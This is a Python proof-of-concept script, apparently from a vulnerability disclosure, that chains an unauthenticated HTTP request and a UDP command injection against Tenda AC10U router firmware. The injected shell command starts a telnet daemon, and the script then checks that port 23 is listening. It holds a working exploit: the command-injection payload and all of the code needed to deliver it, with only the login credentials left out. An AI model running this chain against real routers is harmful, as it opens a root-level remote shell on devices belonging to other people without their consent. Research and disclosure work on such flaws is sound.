#!/usr/bin/env python3
"""
C-1 sanitized full-chain proof of concept -- Tenda AC10U V1.0 V15.03.06.48.

Steps
-----
1. GET /goform/ate   -> starts the ATE listener (unauthenticated in factory state)
2. UDP 7329          -> injects "ifconfig ;/usr/sbin/telnetd -b <lan_ip>;#"
3. TCP 23            -> confirms that the injected command started telnetd
4. manual login      -> credentials are NOT included. They belong to a separate
                        finding (hard-coded credential) and are deliberately
                        redacted here.

What this script does NOT do
---------------------------
- no credential is embedded or transmitted
- no reverse shell, no persistence, no destructive command
- no device configuration is modified

Preconditions
-------------
- Device in factory/reset state: `sys.userpass` is empty, so
  R7WebsSecurityHandler@0x434e80 serves /goform/ate without authentication.
- UDP 7329 and TCP 23 reachable from the tester.

Usage
-----
    python3 chain_c1.py <device-ip> [--lan-ip <ip>]

Expected result after step 3: TCP 23 is LISTEN. Step 4 is manual:

    telnet <device-ip> 23
    login: <redacted>
    ~ # id
    uid=0(root) gid=0(root)
"""

from __future__ import annotations

import argparse
import socket
import sys
import time
from urllib.request import urlopen

DEFAULT_HTTP_PORT = 80
DEFAULT_UDP_PORT = 7329
DEFAULT_TELNET_PORT = 23


def start_ate(host: str, port: int = DEFAULT_HTTP_PORT, timeout: float = 5.0) -> None:
    url = f"http://{host}:{port}/goform/ate"
    print(f"[1] GET {url}")
    try:
        with urlopen(url, timeout=timeout) as resp:
            print(f"    HTTP {resp.status}")
    except Exception as exc:  # noqa: BLE001 - listener may already be running
        print(f"    [!] request failed: {exc}")
        print("    (the ATE listener may already be running; continuing)")


def inject_telnetd(host: str, lan_ip: str, port: int = DEFAULT_UDP_PORT,
                   timeout: float = 10.0) -> None:
    payload = f"ifconfig ;/usr/sbin/telnetd -b {lan_ip};#".encode()
    print(f"[2] UDP {host}:{port} <- {payload!r}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        sock.sendto(payload, (host, port))
        data, _ = sock.recvfrom(4096)
        print(f"    response: {data[:120]!r}")
    except socket.timeout:
        print("    [!] no response (ATE listener not running, or port blocked)")
    finally:
        sock.close()


def probe_telnet(host: str, port: int = DEFAULT_TELNET_PORT,
                 timeout: float = 10.0) -> bool:
    print(f"[3] TCP {host}:{port}")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection((host, port), timeout=2.0) as sock:
                sock.settimeout(2.0)
                try:
                    banner = sock.recv(256)
                except socket.timeout:
                    banner = b""
                print(f"    LISTEN (banner: {banner[:80]!r})")
                return True
        except OSError:
            time.sleep(0.5)
    print("    not listening (check that the device accepted the injected command)")
    return False


def main() -> int:
    parser = argparse.ArgumentParser(
        description="C-1 sanitized full-chain PoC (no credentials included)")
    parser.add_argument("host", help="device IP address")
    parser.add_argument("--lan-ip", default=None,
                        help="address telnetd should bind to (default: host)")
    parser.add_argument("--http-port", type=int, default=DEFAULT_HTTP_PORT)
    parser.add_argument("--udp-port", type=int, default=DEFAULT_UDP_PORT)
    args = parser.parse_args()

    lan_ip = args.lan_ip or args.host
    print("[*] Precondition: factory/reset state, sys.userpass empty")

    start_ate(args.host, args.http_port)
    inject_telnetd(args.host, lan_ip, args.udp_port)
    listening = probe_telnet(args.host)

    print()
    if listening:
        print("[4] Manual step: telnet to the device and authenticate.")
        print("    Credentials are intentionally omitted (separate finding).")
        print("    Expected privilege after login: uid=0(root)")
        return 0
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
